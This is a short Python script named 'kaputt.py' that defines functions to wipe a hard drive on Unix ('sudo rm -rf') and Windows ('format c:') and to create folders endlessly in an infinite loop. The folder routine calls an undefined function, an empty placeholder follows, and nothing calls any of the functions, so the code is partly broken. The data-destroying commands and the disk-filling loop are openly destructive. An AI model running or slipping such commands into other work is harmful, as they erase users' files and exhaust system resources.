#kaputt.py
#by aaron montoya-moraga
#june 2018
#v0.0.3

#import modules
import os
import string

#function for wiping hard drive - Unix OS
def wipeUnix():
    os.system("sudo rm -rf")

#function for wiping hard drive - Windows OS
def wipeWindows():
    os.system("format c:")

#create infinite folders
def infiniteFolders():

    #function definition of makeFolders
    #arguments are the current foldername and the ascii letters
    def makeFolders(foldername, characters):
        #for every character
        for character in characters:
            #append the current character to the current foldername
            foldername = foldername + character
            #build command to pass to the terminal
            command = "mkdir " + foldername
            #send the command to the terminal
            system(command)
            #print to the terminal the name of the just created folder
            message = "created the folder " + foldername
            print(message)

    #get all of the ascii characters in lowercase
    characters = string.ascii_lowercase

    #initialize foldername as blank
    foldername = ""

    #infinite loop
    while (True):
        #iterate through every letter
        for character in characters:
            # append a new character to the foldername
            foldername = foldername + character
            # call to the function to create new folders
            makeFolders(foldername, characters)

#create infinite files
def infiniteFiles():
    print("placeholder")
